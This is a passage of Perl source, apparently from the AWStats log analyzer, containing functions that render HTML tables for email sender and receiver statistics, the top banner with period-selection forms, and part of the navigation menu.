);\n\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th colspan=\\\"3\\\">$Message[131] : \"\n\t  . ( scalar keys %_emails_h ) . \"</th>\";\n\tif ( $ShowEMailSenders =~ /H/i ) {\n\t\tprint \"<th rowspan=\\\"2\\\" bgcolor=\\\"#$color_h\\\" width=\\\"80\\\"\"\n\t\t  . Tooltip(4)\n\t\t  . \">$Message[57]</th>\";\n\t}\n\tif ( $ShowEMailSenders =~ /B/i ) {\n\t\tprint\n\"<th class=\\\"datasize\\\" rowspan=\\\"2\\\" bgcolor=\\\"#$color_k\\\" width=\\\"80\\\"\"\n\t\t  . Tooltip(5)\n\t\t  . \">$Message[75]</th>\";\n\t}\n\tif ( $ShowEMailSenders =~ /M/i ) {\n\t\tprint\n\"<th rowspan=\\\"2\\\" bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[106]</th>\";\n\t}\n\tif ( $ShowEMailSenders =~ /L/i ) {\n\t\tprint \"<th rowspan=\\\"2\\\" width=\\\"120\\\">$Message[9]</th>\";\n\t}\n\tprint \"</tr>\\n\";\n\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th width=\\\"30%\\\">Local</th><th>&nbsp;</th><th width=\\\"30%\\\">External</th></tr>\";\n\t$total_p = $total_h = $total_k = 0;\n\t$max_h = 1;\n\tforeach ( values %_emails_h ) {\n\t\tif ( $_ > $max_h ) { $max_h = $_; }\n\t}\n\t$max_k = 1;\n\tforeach ( values %_emails_k ) {\n\t\tif ( $_ > $max_k ) { $max_k = $_; }\n\t}\n\tmy $count = 0;\n\tif ( !$HTMLOutput{'allemails'} && !$HTMLOutput{'lastemails'} ) {\n\t\t&BuildKeyList( $MaxNbOf{'EMailsShown'}, $MinHit{'EMail'}, \\%_emails_h,\n\t\t\t\\%_emails_h );\n\t}\n\tif ( $HTMLOutput{'allemails'} ) {\n\t\t&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'EMail'}, \\%_emails_h,\n\t\t\t\\%_emails_h );\n\t}\n\tif ( $HTMLOutput{'lastemails'} ) {\n\t\t&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'EMail'}, \\%_emails_h,\n\t\t\t\\%_emails_l );\n\t}\n\tforeach my $key (@keylist) {\n\t\tmy $newkey = $key;\n\t\tif ( length($key) > $MaxLengthOfShownEMail ) {\n\t\t\t$newkey = substr( $key, 0, $MaxLengthOfShownEMail ) . \"...\";\n\t\t}\n\t\tmy $bredde_h = 0;\n\t\tmy $bredde_k = 0;\n\t\tif ( $max_h > 0 ) {\n\t\t\t$bredde_h = int( $BarWidth * $_emails_h{$key} / $max_h ) + 1;\n\t\t}\n\t\tif ( $max_k > 0 ) {\n\t\t\t$bredde_k = int( $BarWidth * $_emails_k{$key} / $max_k ) + 1;\n\t\t}\n\t\tprint \"<tr>\";\n\t\tmy $direction = IsLocalEMail($key);\n\n\t\tif ( $direction > 0 ) {\n\t\t\tprint \"<td class=\\\"aws\\\">$newkey</td><td>-&gt;</td><td>&nbsp;</td>\";\n\t\t}\n\t\tif ( $direction == 0 ) {\n\t\t\tprint\n\"<td colspan=\\\"3\\\"><span style=\\\"color: #$color_other\\\">$newkey</span></td>\";\n\t\t}\n\t\tif ( $direction < 0 ) {\n\t\t\tprint \"<td class=\\\"aws\\\">&nbsp;</td><td>&lt;-</td><td>$newkey</td>\";\n\t\t}\n\t\tif ( $ShowEMailSenders =~ /H/i ) { print \"<td>$_emails_h{$key}</td>\"; }\n\t\tif ( $ShowEMailSenders =~ /B/i ) {\n\t\t\tprint \"<td nowrap=\\\"nowrap\\\">\"\n\t\t\t  . Format_Bytes( $_emails_k{$key} ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowEMailSenders =~ /M/i ) {\n\t\t\tprint \"<td nowrap=\\\"nowrap\\\">\"\n\t\t\t  . Format_Bytes( $_emails_k{$key} / ( $_emails_h{$key} || 1 ) )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tif ( $ShowEMailSenders =~ /L/i ) {\n\t\t\tprint \"<td nowrap=\\\"nowrap\\\">\"\n\t\t\t  . ( $_emails_l{$key} ? Format_Date( $_emails_l{$key}, 1 ) : '-' )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\n\t\t#$total_p += $_emails_p{$key};\n\t\t$total_h += $_emails_h{$key};\n\t\t$total_k += $_emails_k{$key};\n\t\t$count++;\n\t}\n\t$rest_p = 0;                        # $rest_p=$TotalPages-$total_p;\n\t$rest_h = $TotalHits - $total_h;\n\t$rest_k = $TotalBytes - $total_k;\n\tif ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 ) { # All other sender emails\n\t\tprint\n\"<tr><td colspan=\\\"3\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td>\";\n\t\tif ( $ShowEMailSenders =~ /H/i ) { print \"<td>$rest_h</td>\"; }\n\t\tif ( $ShowEMailSenders =~ /B/i ) {\n\t\t\tprint \"<td nowrap=\\\"nowrap\\\">\" . Format_Bytes($rest_k) . \"</td>\";\n\t\t}\n\t\tif ( $ShowEMailSenders =~ /M/i ) {\n\t\t\tprint \"<td nowrap=\\\"nowrap\\\">\"\n\t\t\t  . Format_Bytes( $rest_k / ( $rest_h || 1 ) ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowEMailSenders =~ /L/i ) { print \"<td>&nbsp;</td>\"; }\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints HTML to display an email receivers chart\n# Parameters:   -\n# Input:        $NewLinkParams, NewLinkTarget\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLShowEmailReceiversChart {\n\tmy $NewLinkParams         = shift;\n\tmy $NewLinkTarget         = shift;\n\tmy $MaxLengthOfShownEMail = 48;\n\n\tmy $total_p;\n\tmy $total_h;\n\tmy $total_k;\n\tmy $max_p;\n\tmy $max_h;\n\tmy $max_k;\n\tmy $rest_p;\n\tmy $rest_h;\n\tmy $rest_k;\n\n\t# Show filter form\n\t#&ShowFormFilter(\"emailrfilter\",$EmailrFilter);\n\t# Show emails list\n\n\tprint \"$Center<a name=\\\"emailreceivers\\\">&nbsp;</a><br />\\n\";\n\tmy $title;\n\tif ( $HTMLOutput{'allemailr'} || $HTMLOutput{'lastemailr'} ) {\n\t\t$title = \"$Message[132]\";\n\t}\n\telse {\n\t\t$title =\n\"$Message[132] ($Message[77] $MaxNbOf{'EMailsShown'}) &nbsp; - &nbsp; <a href=\\\"\"\n\t\t  . (\n\t\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t\t  || !$StaticLinks\n\t\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=allemailr\")\n\t\t\t: \"$StaticLinks.allemailr.$StaticExt\"\n\t\t  )\n\t\t  . \"\\\"$NewLinkTarget>$Message[80]</a>\";\n\t\tif ( $ShowEMailReceivers =~ /L/i ) {\n\t\t\t$title .= \" &nbsp; - &nbsp; <a href=\\\"\"\n\t\t\t  . (\n\t\t\t\t$ENV{'GATEWAY_INTERFACE'}\n\t\t\t\t  || !$StaticLinks\n\t\t\t\t? XMLEncode(\"$AWScript${NewLinkParams}output=lastemailr\")\n\t\t\t\t: \"$StaticLinks.lastemailr.$StaticExt\"\n\t\t\t  )\n\t\t\t  . \"\\\"$NewLinkTarget>$Message[9]</a>\";\n\t\t}\n\t}\n\t&tab_head( \"$title\", 19, 0, 'emailreceivers' );\n\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th colspan=\\\"3\\\">$Message[132] : \"\n\t  . ( scalar keys %_emailr_h ) . \"</th>\";\n\tif ( $ShowEMailReceivers =~ /H/i ) {\n\t\tprint \"<th rowspan=\\\"2\\\" bgcolor=\\\"#$color_h\\\" width=\\\"80\\\"\"\n\t\t  . Tooltip(4)\n\t\t  . \">$Message[57]</th>\";\n\t}\n\tif ( $ShowEMailReceivers =~ /B/i ) {\n\t\tprint\n\"<th class=\\\"datasize\\\" rowspan=\\\"2\\\" bgcolor=\\\"#$color_k\\\" width=\\\"80\\\"\"\n\t\t  . Tooltip(5)\n\t\t  . \">$Message[75]</th>\";\n\t}\n\tif ( $ShowEMailReceivers =~ /M/i ) {\n\t\tprint\n\"<th rowspan=\\\"2\\\" bgcolor=\\\"#$color_k\\\" width=\\\"80\\\">$Message[106]</th>\";\n\t}\n\tif ( $ShowEMailReceivers =~ /L/i ) {\n\t\tprint \"<th rowspan=\\\"2\\\" width=\\\"120\\\">$Message[9]</th>\";\n\t}\n\tprint \"</tr>\\n\";\n\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><th width=\\\"30%\\\">Local</th><th>&nbsp;</th><th width=\\\"30%\\\">External</th></tr>\";\n\t$total_p = $total_h = $total_k = 0;\n\t$max_h = 1;\n\tforeach ( values %_emailr_h ) {\n\t\tif ( $_ > $max_h ) { $max_h = $_; }\n\t}\n\t$max_k = 1;\n\tforeach ( values %_emailr_k ) {\n\t\tif ( $_ > $max_k ) { $max_k = $_; }\n\t}\n\tmy $count = 0;\n\tif ( !$HTMLOutput{'allemailr'} && !$HTMLOutput{'lastemailr'} ) {\n\t\t&BuildKeyList( $MaxNbOf{'EMailsShown'}, $MinHit{'EMail'}, \\%_emailr_h,\n\t\t\t\\%_emailr_h );\n\t}\n\tif ( $HTMLOutput{'allemailr'} ) {\n\t\t&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'EMail'}, \\%_emailr_h,\n\t\t\t\\%_emailr_h );\n\t}\n\tif ( $HTMLOutput{'lastemailr'} ) {\n\t\t&BuildKeyList( $MaxRowsInHTMLOutput, $MinHit{'EMail'}, \\%_emailr_h,\n\t\t\t\\%_emailr_l );\n\t}\n\tforeach my $key (@keylist) {\n\t\tmy $newkey = $key;\n\t\tif ( length($key) > $MaxLengthOfShownEMail ) {\n\t\t\t$newkey = substr( $key, 0, $MaxLengthOfShownEMail ) . \"...\";\n\t\t}\n\t\tmy $bredde_h = 0;\n\t\tmy $bredde_k = 0;\n\t\tif ( $max_h > 0 ) {\n\t\t\t$bredde_h = int( $BarWidth * $_emailr_h{$key} / $max_h ) + 1;\n\t\t}\n\t\tif ( $max_k > 0 ) {\n\t\t\t$bredde_k = int( $BarWidth * $_emailr_k{$key} / $max_k ) + 1;\n\t\t}\n\t\tprint \"<tr>\";\n\t\tmy $direction = IsLocalEMail($key);\n\n\t\tif ( $direction > 0 ) {\n\t\t\tprint \"<td class=\\\"aws\\\">$newkey</td><td>&lt;-</td><td>&nbsp;</td>\";\n\t\t}\n\t\tif ( $direction == 0 ) {\n\t\t\tprint\n\"<td colspan=\\\"3\\\"><span style=\\\"color: #$color_other\\\">$newkey</span></td>\";\n\t\t}\n\t\tif ( $direction < 0 ) {\n\t\t\tprint \"<td class=\\\"aws\\\">&nbsp;</td><td>-&gt;</td><td>$newkey</td>\";\n\t\t}\n\t\tif ( $ShowEMailReceivers =~ /H/i ) {\n\t\t\tprint \"<td>$_emailr_h{$key}</td>\";\n\t\t}\n\t\tif ( $ShowEMailReceivers =~ /B/i ) {\n\t\t\tprint \"<td nowrap=\\\"nowrap\\\">\"\n\t\t\t  . Format_Bytes( $_emailr_k{$key} ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowEMailReceivers =~ /M/i ) {\n\t\t\tprint \"<td nowrap=\\\"nowrap\\\">\"\n\t\t\t  . Format_Bytes( $_emailr_k{$key} / ( $_emailr_h{$key} || 1 ) )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tif ( $ShowEMailReceivers =~ /L/i ) {\n\t\t\tprint \"<td nowrap=\\\"nowrap\\\">\"\n\t\t\t  . ( $_emailr_l{$key} ? Format_Date( $_emailr_l{$key}, 1 ) : '-' )\n\t\t\t  . \"</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\n\t\t#$total_p += $_emailr_p{$key};\n\t\t$total_h += $_emailr_h{$key};\n\t\t$total_k += $_emailr_k{$key};\n\t\t$count++;\n\t}\n\t$rest_p = 0;                        # $rest_p=$TotalPages-$total_p;\n\t$rest_h = $TotalHits - $total_h;\n\t$rest_k = $TotalBytes - $total_k;\n\tif ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 )\n\t{                                   # All other receiver emails\n\t\tprint\n\"<tr><td colspan=\\\"3\\\"><span style=\\\"color: #$color_other\\\">$Message[2]</span></td>\";\n\t\tif ( $ShowEMailReceivers =~ /H/i ) { print \"<td>$rest_h</td>\"; }\n\t\tif ( $ShowEMailReceivers =~ /B/i ) {\n\t\t\tprint \"<td nowrap=\\\"nowrap\\\">\" . Format_Bytes($rest_k) . \"</td>\";\n\t\t}\n\t\tif ( $ShowEMailReceivers =~ /M/i ) {\n\t\t\tprint \"<td nowrap=\\\"nowrap\\\">\"\n\t\t\t  . Format_Bytes( $rest_k / ( $rest_h || 1 ) ) . \"</td>\";\n\t\t}\n\t\tif ( $ShowEMailReceivers =~ /L/i ) { print \"<td>&nbsp;</td>\"; }\n\t\tprint \"</tr>\\n\";\n\t}\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the top banner of the inner frame or static page\n# Parameters:   $WIDTHMENU1\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLTopBanner{\n\tmy $WIDTHMENU1 = shift;\n\tmy $frame = ( $FrameName eq 'mainleft' );\n\n\tif ($Debug) { debug( \"ShowTopBan\", 2 ); }\n\tprint \"$Center<a name=\\\"menu\\\">&nbsp;</a>\\n\";\n\n\tif ( $FrameName ne 'mainleft' ) {\n\t\tmy $NewLinkParams = ${QueryString};\n\t\t$NewLinkParams =~ s/(^|&|&amp;)update(=\\w*|$)//i;\n\t\t$NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\\w*|$)//i;\n\t\t$NewLinkParams =~ s/(^|&|&amp;)year=[^&]*//i;\n\t\t$NewLinkParams =~ s/(^|&|&amp;)month=[^&]*//i;\n\t\t$NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;\n\t\t$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;\n\t\t$NewLinkParams =~ s/^&amp;//;\n\t\t$NewLinkParams =~ s/&amp;$//;\n\t\tmy $NewLinkTarget = '';\n\n\t\tif ( $FrameName eq 'mainright' ) {\n\t\t\t$NewLinkTarget = \" target=\\\"_parent\\\"\";\n\t\t}\n\t\tprint \"<form name=\\\"FormDateFilter\\\" action=\\\"\"\n\t\t  . XMLEncode(\"$AWScript${NewLinkParams}\")\n\t\t  . \"\\\" style=\\\"padding: 0px 0px 20px 0px; margin-top: 0\\\"$NewLinkTarget>\\n\";\n\t}\n\n\tif ( $QueryString !~ /buildpdf/i ) {\n\t\tprint\n\"<table class=\\\"aws_border\\\" border=\\\"0\\\" cellpadding=\\\"2\\\" cellspacing=\\\"0\\\" width=\\\"100%\\\">\\n\";\n\t\tprint \"<tr><td>\\n\";\n\t\tprint\n\"<table class=\\\"aws_data sortable\\\" border=\\\"0\\\" cellpadding=\\\"1\\\" cellspacing=\\\"0\\\" width=\\\"100%\\\">\\n\";\n\t}\n\telse {\n\t\tprint \"<table width=\\\"100%\\\">\\n\";\n\t}\n\n\tif ( $FrameName ne 'mainright' ) {\n\n\t\t# Print Statistics Of\n\t\tif ( $FrameName eq 'mainleft' ) {\n\t\t\tmy $shortSiteDomain = $SiteDomain;\n\t\t\tif ( length($SiteDomain) > 30 ) {\n\t\t\t\t$shortSiteDomain =\n\t\t\t\t    substr( $SiteDomain, 0, 20 ) . \"...\"\n\t\t\t\t  . substr( $SiteDomain, length($SiteDomain) - 5, 5 );\n\t\t\t}\n\t\t\tprint\n\"<tr><td class=\\\"awsm\\\"><b>$Message[7]:</b></td></tr><tr><td class=\\\"aws\\\"><span style=\\\"font-size: 12px;\\\">$shortSiteDomain</span></td>\";\n\t\t}\n\t\telse {\n\t\t\tprint\n\"<tr><td class=\\\"aws\\\" valign=\\\"middle\\\"><b>$Message[7]:</b>&nbsp;</td><td class=\\\"aws\\\" valign=\\\"middle\\\"><span style=\\\"font-size: 14px;\\\">$SiteDomain</span></td>\";\n\t\t}\n\n\t\t# Logo and flags\n\t\tif ( $FrameName ne 'mainleft' ) {\n\t\t\tif ( $LogoLink =~ \"http://www.awstats.org\" ) {\n\t\t\t\tprint \"<td align=\\\"right\\\" rowspan=\\\"3\\\"><a href=\\\"\"\n\t\t\t\t  . XMLEncode($LogoLink)\n\t\t\t\t  . \"\\\" target=\\\"awstatshome\\\"><img src=\\\"$DirIcons/other/$Logo\\\" border=\\\"0\\\"\"\n\t\t\t\t  . AltTitle( ucfirst($PROG) . \" Web Site\" )\n\t\t\t\t  . \" /></a>\";\n\t\t\t}\n\t\t\telse {\n\t\t\t\tprint \"<td align=\\\"right\\\" rowspan=\\\"3\\\"><a href=\\\"\"\n\t\t\t\t  . XMLEncode($LogoLink)\n\t\t\t\t  . \"\\\" target=\\\"awstatshome\\\"><img src=\\\"$DirIcons/other/$Logo\\\" border=\\\"0\\\" /></a>\";\n\t\t\t}\n\t\t\tif ( !$StaticLinks ) { print \"<br />\"; Show_Flag_Links($Lang); }\n\t\t\tprint \"</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t}\n\tif ( $FrameName ne 'mainleft' ) {\n\n\t\t# Print Last Update\n\t\tprint\n\"<tr valign=\\\"middle\\\"><td class=\\\"aws\\\" valign=\\\"middle\\\" width=\\\"$WIDTHMENU1\\\"><b>$Message[35]:</b>&nbsp;</td>\";\n\t\tprint\n\"<td class=\\\"aws\\\" valign=\\\"middle\\\"><span style=\\\"font-size: 12px;\\\">\";\n\t\tif ($LastUpdate) { print Format_Date( $LastUpdate, 0 ); }\n\t\telse {\n\n\t\t\t# Here NbOfOldLines = 0 (because LastUpdate is not defined)\n\t\t\tif ( !$UpdateStats ) {\n\t\t\t\tprint \"<span style=\\\"color: #880000\\\">$Message[24]</span>\";\n\t\t\t}\n\t\t\telse {\n\t\t\t\tprint\n \"<span style=\\\"color: #880000\\\">No qualified records found in log \n ($NbOfLinesCorrupted corrupted, $NbOfLinesComment comments, $NbOfLinesBlank Blank, \n $NbOfLinesDropped dropped)</span>\";\n\t\t\t}\n\t\t}\n\t\tprint \"</span>\";\n\n\t\t# Print Update Now link\n\t\tif ( $AllowToUpdateStatsFromBrowser && !$StaticLinks ) {\n\t\t\tmy $NewLinkParams = ${QueryString};\n\t\t\t$NewLinkParams =~ s/(^|&|&amp;)update(=\\w*|$)//i;\n\t\t\t$NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\\w*|$)//i;\n\t\t\t$NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;\n\t\t\tif ( $FrameName eq 'mainright' ) {\n\t\t\t\t$NewLinkParams .= \"&amp;framename=mainright\";\n\t\t\t}\n\t\t\t$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;\n\t\t\t$NewLinkParams =~ s/^&amp;//;\n\t\t\t$NewLinkParams =~ s/&amp;$//;\n\t\t\tif ($NewLinkParams) { $NewLinkParams = \"${NewLinkParams}&amp;\"; }\n\t\t\tprint \"&nbsp; &nbsp; &nbsp; &nbsp;\";\n\t\t\tprint \"<a href=\\\"\"\n\t\t\t  . XMLEncode(\"$AWScript${NewLinkParams}update=1\")\n\t\t\t  . \"\\\">$Message[74]</a>\";\n\t\t}\n\t\tprint \"</td>\";\n\n\t\t# Logo and flags\n\t\tif ( $FrameName eq 'mainright' ) {\n\t\t\tif ( $LogoLink =~ \"http://www.awstats.org\" ) {\n\t\t\t\tprint \"<td align=\\\"right\\\" rowspan=\\\"2\\\"><a href=\\\"\"\n\t\t\t\t  . XMLEncode($LogoLink)\n\t\t\t\t  . \"\\\" target=\\\"awstatshome\\\"><img src=\\\"$DirIcons/other/$Logo\\\" border=\\\"0\\\"\"\n\t\t\t\t  . AltTitle( ucfirst($PROG) . \" Web Site\" )\n\t\t\t\t  . \" /></a>\\n\";\n\t\t\t}\n\t\t\telse {\n\t\t\t\tprint \"<td align=\\\"right\\\" rowspan=\\\"2\\\"><a href=\\\"\"\n\t\t\t\t  . XMLEncode($LogoLink)\n\t\t\t\t  . \"\\\" target=\\\"awstatshome\\\"><img src=\\\"$DirIcons/other/$Logo\\\" border=\\\"0\\\" /></a>\\n\";\n\t\t\t}\n\t\t\tif ( !$StaticLinks ) { print \"<br />\"; Show_Flag_Links($Lang); }\n\t\t\tprint \"</td>\";\n\t\t}\n\n\t\tprint \"</tr>\\n\";\n\n\t\t# Print selected period of analysis (month and year required)\n\t\tprint\n\"<tr><td class=\\\"aws\\\" valign=\\\"middle\\\"><b>$Message[133]:</b></td>\";\n\t\tprint \"<td class=\\\"aws\\\" valign=\\\"middle\\\">\";\n\t\tif ( $ENV{'GATEWAY_INTERFACE'} || !$StaticLinks ) {\n\t\t\tprint \"<select class=\\\"aws_formfield\\\" name=\\\"month\\\">\\n\";\n\t\t\tforeach ( 1 .. 12 ) {\n\t\t\t\tmy $monthix = sprintf( \"%02s\", $_ );\n\t\t\t\tprint \"<option\"\n\t\t\t\t  . (\n\t\t\t\t\t  \"$MonthRequired\" eq \"$monthix\"\n\t\t\t\t\t? \" selected=\\\"selected\\\"\"\n\t\t\t\t\t: \"\"\n\t\t\t\t  )\n\t\t\t\t  . \" value=\\\"$monthix\\\">$MonthNumLib{$monthix}</option>\\n\";\n\t\t\t}\n\t\t\tif ( $AllowFullYearView >= 2 ) {\n\t\t\t\tprint \"<option\"\n\t\t\t\t  . ( $MonthRequired eq 'all' ? \" selected=\\\"selected\\\"\" : \"\" )\n\t\t\t\t  . \" value=\\\"all\\\">- $Message[6] -</option>\\n\";\n\t\t\t}\n\t\t\tprint \"</select>\\n\";\n\t\t\tprint \"<select class=\\\"aws_formfield\\\" name=\\\"year\\\">\\n\";\n\n\t\t\t# Add YearRequired in list if not in ListOfYears\n\t\t\t$ListOfYears{$YearRequired} ||= $MonthRequired;\n\t\t\tforeach ( sort keys %ListOfYears ) {\n\t\t\t\tprint \"<option\"\n\t\t\t\t  . ( $YearRequired eq \"$_\" ? \" selected=\\\"selected\\\"\" : \"\" )\n\t\t\t\t  . \" value=\\\"$_\\\">$_</option>\\n\";\n\t\t\t}\n\t\t\tprint \"</select>\\n\";\n\t\t\tprint \"<input type=\\\"hidden\\\" name=\\\"output\\\" value=\\\"\"\n\t\t\t  . join( ',', keys %HTMLOutput )\n\t\t\t  . \"\\\" />\\n\";\n\t\t\tif ($SiteConfig) {\n\t\t\t\tprint\n\"<input type=\\\"hidden\\\" name=\\\"config\\\" value=\\\"$SiteConfig\\\" />\\n\";\n\t\t\t}\n\t\t\tif ($DirConfig) {\n\t\t\t\tprint\n\"<input type=\\\"hidden\\\" name=\\\"configdir\\\" value=\\\"$DirConfig\\\" />\\n\";\n\t\t\t}\n\t\t\tif ( $QueryString =~ /lang=(\\w+)/i ) {\n\t\t\t\tprint\n\t\t\t\t  \"<input type=\\\"hidden\\\" name=\\\"lang\\\" value=\\\"$1\\\" />\\n\";\n\t\t\t}\n\t\t\tif ( $QueryString =~ /debug=(\\d+)/i ) {\n\t\t\t\tprint\n\t\t\t\t  \"<input type=\\\"hidden\\\" name=\\\"debug\\\" value=\\\"$1\\\" />\\n\";\n\t\t\t}\n\t\t\tif ( $FrameName eq 'mainright' ) {\n\t\t\t\tprint\n\"<input type=\\\"hidden\\\" name=\\\"framename\\\" value=\\\"index\\\" />\\n\";\n\t\t\t}\n\t\t\tprint\n\"<input type=\\\"submit\\\" value=\\\" $Message[115] \\\" class=\\\"aws_button\\\" />\";\n\t\t}\n\t\telse {\n\t\t\tprint \"<span style=\\\"font-size: 14px;\\\">\";\n\t\t\tif ($DayRequired) { print \"$Message[4] $DayRequired - \"; }\n\t\t\tif ( $MonthRequired eq 'all' ) {\n\t\t\t\tprint \"$Message[6] $YearRequired\";\n\t\t\t}\n\t\t\telse {\n\t\t\t\tprint\n\t\t\t\t  \"$Message[5] $MonthNumLib{$MonthRequired} $YearRequired\";\n\t\t\t}\n\t\t\tprint \"</span>\";\n\t\t}\n\t\tprint \"</td></tr>\\n\";\n\t}\n\tif ( $QueryString !~ /buildpdf/i ) {\n\t\tprint \"</table>\\n\";\n\t\tprint \"</td></tr></table>\\n\";\n\t}\n\telse {\n\t\tprint \"</table>\\n\";\n\t}\n\n\tif ( $FrameName ne 'mainleft' ) { print \"</form><br />\\n\"; }\n\telse { print \"<br />\\n\"; }\n\tprint \"\\n\";\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the menu in a frame or below the top banner\n# Parameters:   _\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMenu{\n\tmy $NewLinkParams = shift;\n\tmy $NewLinkTarget = shift;\n\tmy $frame = ( $FrameName eq 'mainleft' );\n\n\tif ($Debug) { debug( \"ShowMenu\", 2 ); }\n\n\t# Print menu links\n\tif ( ( $HTMLOutput{'main'} && $FrameName ne 'mainright' )\n\t\t|| $FrameName eq 'mainleft' )\n\t{    # If main page asked\n\t\t    # Define link anchor\n\t\tmy $linkanchor =\n\t\t  ( $FrameName eq 'mainleft' ? \"$AWScript${NewLinkParams}\" : \"\" );\n\t\tif ( $linkanchor && ( $linkanchor !~ /framename=mainright/ ) ) {\n\t\t\t$linkanchor .= \"framename=mainright\";\n\t\t}\n\t\t$linkanchor =~ s/(&|&amp;)$//;\n\t\t$linkanchor = XMLEncode(\"$linkanchor\");\n\n\t\t# Define target\n\t\tmy $targetpage =\n\t\t  ( $FrameName eq 'mainleft' ? \" target=\\\"mainright\\\"\" : \"\" );\n\n\t\t# Print Menu\n\t\tmy $linetitle;    # TODO a virer\n\t\tif ( !$PluginsLoaded{'ShowMenu'}{'menuapplet'} ) {\n\t\t\tmy $menuicon = 0;    # TODO a virer\n\t\t\t                     # Menu HTML\n\t\t\tprint \"<table\"\n\t\t\t  . (\n\t\t\t\t$frame\n\t\t\t\t? \" cellspacing=\\\"0\\\" cellpadding=\\\"0\\\" border=\\\"0\\\"\"\n\t\t\t\t: \"\"\n\t\t\t  )\n\t\t\t  . \">\\n\";\n\t\t\tif ( $FrameName eq 'mainleft' && $ShowMonthStats ) {\n\t\t\t\tprint( $frame? \"<tr><td class=\\\"awsm\\\">\" : \"\" );\n\t\t\t\tprint\n\"<a href=\\\"$linkanchor#top\\\"$targetpage>$Message[128]</a>\";\n\t\t\t\tprint( $frame? \"</td></tr>\\n\" : \" &nbsp; \" );\n\t\t\t}\n\t\t\tmy %menu     = ();\n\t\t\tmy %menulink = ();\n\t\t\tmy %menutext = ();\n\n\t\t\t# When\n\t\t\t%menu = (\n\t\t\t\t'month'       => $ShowMonthStats       ? 1 : 0,\n\t\t\t\t'daysofmonth' => $ShowDaysOfMonthStats ? 2 : 0,\n\t\t\t\t'daysofweek'  => $ShowDaysOfWeekStats  ? 3 : 0,\n\t\t\t\t'hours'       => $ShowHoursStats       ? 4 : 0\n\t\t\t);\n\t\t\t%menulink = (\n\t\t\t\t'month'       => 1,\n\t\t\t\t'daysofmonth' => 1,\n\t\t\t\t'daysofweek'  => 1,\n\t\t\t\t'hours'       => 1\n\t\t\t);\n\t\t\t%menutext = (\n\t\t\t\t'month'       => $Message[162],\n\t\t\t\t'daysofmonth' => $Message[138],\n\t\t\t\t'daysofweek'  => $Message[91],\n\t\t\t\t'hours'       => $Message[20]\n\t\t\t);\n\t\t\tHTMLShowMenuCateg(\n\t\t\t\t'when',         $Message[93],\n\t\t\t\t'menu4.png',    $frame,\n\t\t\t\t$targetpage,    $linkanchor,\n\t\t\t\t$NewLinkParams, $NewLinkTarget,\n\t\t\t\t\\%menu,         \\%menulink,\n\t\t\t\t\\%menutext\n\t\t\t);\n\n\t\t\t# Who\n\t\t\t%menu = (\n\t\t\t\t'countries'  => $ShowDomainsStats ? 1 : 0,\n\t\t\t\t'alldomains' => $ShowDomainsStats ? 2 : 0,\n\t\t\t\t'visitors'   => $ShowHostsStats   ? 3 : 0,\n\t\t\t\t'allhosts'   => $ShowHostsStats   ? 4 : 0,\n\t\t\t\t'lasthosts' => ( $ShowHostsStats =~ /L/i ) ? 5 : 0,\n\t\t\t\t'unknownip' => $ShowHostsStats         ? 6 : 0,\n\t\t\t\t'logins'    => $ShowAuthenticatedUsers ? 7 : 0,\n\t\t\t\t'alllogins' => $ShowAuthenticatedUsers ? 8 : 0,\n\t\t\t\t'lastlogins' => ( $ShowAuthenticatedUsers =~ /L/i ) ? 9 : 0,\n\t\t\t\t'emailsenders' => $ShowEMailSenders ? 10 : 0,\n\t\t\t\t'allemails'    => $ShowEMailSenders ? 11 : 0,\n\t\t\t\t'lastemails' => ( $ShowEMailSenders =~ /L/i ) ? 12 : 0,\n\t\t\t\t'emailreceivers' => $ShowEMailReceivers ? 13 : 0,\n\t\t\t\t'allemailr'      => $ShowEMailReceivers ? 14 : 0,\n\t\t\t\t'lastemailr' => ( $ShowEMailReceivers =~ /L/i ) ? 15 : 0,\n\t\t\t\t'robots'    => $ShowRobotsStats ? 16 : 0,\n\t\t\t\t'allrobots' => $ShowRobotsStats ? 17 : 0,\n\t\t\t\t'lastrobots' => ( $ShowRobotsStats =~ /L/i ) ? 18 : 0,\n\t\t\t\t'worms' => $ShowWormsStats ? 19 : 0\n\t\t\t);\n\t\t\t%menulink = (\n\t\t\t\t'countries'      => 1,\n\t\t\t\t'alldomains'     => 2,\n\t\t\t\t'visitors'       => 1,\n\t\t\t\t'allhosts'       => 2,\n\t\t\t\t'lasthosts'      => 2,\n\t\t\t\t'unknownip'      => 2,\n\t\t\t\t'logins'         => 1,\n\t\t\t\t'alllogins'      => 